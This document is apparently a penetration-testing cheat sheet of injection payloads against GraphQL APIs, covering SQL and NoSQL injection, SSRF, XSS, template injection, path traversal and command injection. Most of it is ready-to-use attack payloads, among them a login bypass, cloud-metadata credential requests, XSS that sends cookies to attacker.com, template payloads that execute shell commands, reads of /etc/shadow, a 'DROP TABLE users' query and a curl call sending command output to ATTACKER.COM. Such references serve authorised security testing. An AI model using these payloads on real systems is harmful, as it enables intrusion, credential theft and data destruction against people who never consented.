# Injection Testing Reference

## Key Principle

GraphQL itself doesn't protect against injection — it's just a query interface.
Every argument that flows into a resolver and hits a backend system
(database, OS, HTTP client, template engine) is an injection vector.

---

## 1. SQL Injection via GraphQL Arguments

### Detection

```graphql
# Basic SQLi probe — inject into string arguments
query {
  users(filter: "'") { id email }
}

query {
  products(search: "test'--") { id name price }
}

query {
  orders(status: "active' OR '1'='1") { id total }
}
```

**Signs of vulnerability:**
- SQL error messages in response
- `syntax error` / `unterminated quoted string`
- Different results with `' OR '1'='1'` vs normal
- Unexpected data returned

### Error-Based SQLi

```graphql
# MySQL error extraction
query {
  user(email: "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -") {
    id
  }
}

# PostgreSQL error
query {
  search(term: "' AND 1=CAST((SELECT version()) AS int)-- -") {
    results { id }
  }
}

# MSSQL
query {
  lookup(id: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -") {
    data
  }
}
```

### Boolean-Based SQLi

```graphql
# True condition — returns data
query { user(username: "admin' AND '1'='1") { id email } }

# False condition — no data
query { user(username: "admin' AND '1'='2") { id email } }

# Different results = boolean SQLi confirmed
```

### Time-Based Blind SQLi

```graphql
# MySQL — 5 second delay if vulnerable
query {
  user(id: "1' AND SLEEP(5)-- -") { id }
}

# PostgreSQL
query {
  user(id: "1'; SELECT pg_sleep(5)-- -") { id }
}

# MSSQL
query {
  user(id: "1'; WAITFOR DELAY '0:0:5'-- -") { id }
}
```

### ORDER BY / sortBy Injection

```graphql
# Detect — ORDER BY injection often forgotten
query {
  users(orderBy: "name ASC; DROP TABLE users-- -") { id name }
}

query {
  products(sortBy: "(SELECT SLEEP(5))") { id }
}
```

### SQLi via Variables

```graphql
query GetUser($id: ID!) {
  user(id: $id) { id email }
}
```

Send with variables:
```json
{
  "query": "query GetUser($id: ID!) { user(id: $id) { id email } }",
  "variables": { "id": "1 OR 1=1-- -" }
}
```

---

## 2. NoSQL Injection

Common when backend is MongoDB, DynamoDB, Firebase.

### MongoDB Operator Injection

```graphql
# Inject MongoDB operators as string values
query {
  user(email: "{\"$gt\":\"\"}") {
    id email role
  }
}

# Or via variables:
{"variables": {"email": {"$gt": ""}}}

# Bypass login — returns first user (admin)
mutation {
  login(
    email: "{\"$ne\": null}"
    password: "{\"$ne\": null}"
  ) {
    token
    user { id email role }
  }
}
```

### NoSQLi via JSON Variable Manipulation

Intercept in Burp and modify variables:

```json
{
  "query": "mutation Login($email: String!, $pass: String!) { login(email: $email, password: $pass) { token } }",
  "variables": {
    "email": {"$gt": ""},
    "password": {"$gt": ""}
  }
}
```

If variables aren't strictly typed on server → NoSQLi confirmed.

### Regex Injection (MongoDB $regex)

```json
{"variables": {"username": {"$regex": "admin.*"}}}
```

---

## 3. SSRF via GraphQL Resolvers

### Detection — Look for URL Arguments

```graphql
# Find URL-handling mutations/queries in schema
mutation {
  fetchExternalResource(url: "http://169.254.169.254/latest/meta-data/") {
    content
    statusCode
  }
}

mutation {
  importFromUrl(url: "http://localhost:8080/admin") {
    result
  }
}

mutation {
  setWebhook(url: "http://BURP_COLLABORATOR.oastify.com") {
    success
  }
}
```

### SSRF Payload List for GraphQL

```graphql
# AWS metadata
mutation { fetch(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") { content } }

# GCP metadata
mutation { fetch(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") { content } }

# Azure metadata
mutation { fetch(url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01") { content } }

# Localhost internal services
mutation { fetch(url: "http://127.0.0.1:8080/") { content } }
mutation { fetch(url: "http://127.0.0.1:3000/") { content } }
mutation { fetch(url: "http://localhost:6379/") { content } }  # Redis
mutation { fetch(url: "http://localhost:9200/") { content } }  # Elasticsearch

# Burp Collaborator OOB detection
mutation { setWebhook(url: "http://YOUR_BURP_COLLABORATOR.oastify.com/ssrf") { success } }
```

### Blind SSRF Confirmation

If no response body is returned, use Burp Collaborator:
```graphql
mutation {
  importData(sourceUrl: "http://YOUR_COLLABORATOR.oastify.com/graphql-ssrf") {
    jobId
  }
}
```
Check Collaborator for DNS/HTTP interactions.

---

## 4. Stored XSS via GraphQL Mutations

If mutation stores data that is later rendered in HTML:

```graphql
# Stored XSS in comment/post/profile
mutation {
  createComment(
    postId: 1
    content: "<script>document.location='https://attacker.com/?c='+document.cookie</script>"
  ) {
    id
    content
  }
}

mutation {
  updateProfile(
    bio: "<img src=x onerror=alert(document.cookie)>"
    website: "javascript:alert(1)"
  ) {
    user { id bio website }
  }
}

# SVG upload via GraphQL mutation
mutation {
  uploadAvatar(
    content: "<svg onload=alert(document.cookie)>"
    filename: "avatar.svg"
  ) {
    url
  }
}
```

### DOM-Based XSS via GraphQL Response

If GraphQL response data is rendered in DOM without sanitization:
```graphql
# Inject into fields that appear in page title, headings, user-facing content
mutation {
  createProduct(
    name: "</title><script>alert(1)</script>"
    description: "<img src=x onerror=fetch('https://attacker.com/?d='+document.cookie)>"
  ) {
    id
  }
}
```

---

## 5. Server-Side Template Injection (SSTI)

If app uses templates to generate content from GraphQL data:

```graphql
# Jinja2 (Python)
mutation {
  updateProfile(name: "{{7*7}}") { user { name } }
}
# If name returns "49" → SSTI confirmed

# Escalate Jinja2
mutation {
  updateProfile(
    name: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  ) { user { name } }
}

# Twig (PHP)
mutation {
  updateProfile(name: "{{7*'7'}}") { user { name } }
}
# Returns "49" (Jinja2) or "7777777" (Twig)

# FreeMarker (Java)
mutation {
  updateProfile(name: "${7*7}") { user { name } }
}

# Handlebars (Node.js)
mutation {
  updateProfile(name: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}") { user { name } }
}
```

---

## 6. Path Traversal via File Arguments

```graphql
# Look for file/document operations
query {
  getFile(path: "../../../etc/passwd") {
    content
  }
}

mutation {
  processTemplate(templatePath: "../../../../etc/shadow") {
    result
  }
}

query {
  readDocument(filename: "....//....//....//etc/passwd") {
    content
  }
}
```

---

## 7. Command Injection

```graphql
# If resolver passes arguments to shell
mutation {
  generateReport(
    format: "pdf; id > /tmp/rce.txt #"
    userId: 1
  ) {
    downloadUrl
  }
}

mutation {
  pingHost(
    host: "127.0.0.1; curl http://ATTACKER.COM/$(id|base64)"
  ) {
    result
    latency
  }
}
```

---

## 8. Injection Testing Checklist

```
For each string argument in schema:
[ ] Single quote test → SQLi error?
[ ] OR 1=1 test → extra data returned?
[ ] SLEEP/pg_sleep test → time-based SQLi?
[ ] $gt/$ne MongoDB operator → NoSQLi?
[ ] {{7*7}} → SSTI?
[ ] <script>alert(1)</script> → XSS stored?

For each URL/endpoint argument:
[ ] Cloud metadata URL → SSRF?
[ ] Localhost URLs → internal services?
[ ] Burp Collaborator → blind SSRF?

For each file/path argument:
[ ] ../../etc/passwd → path traversal?

For each shell-like arguments (ping, convert, export):
[ ] ; id → command injection?
[ ] | curl ATTACKER → blind RCE?
```
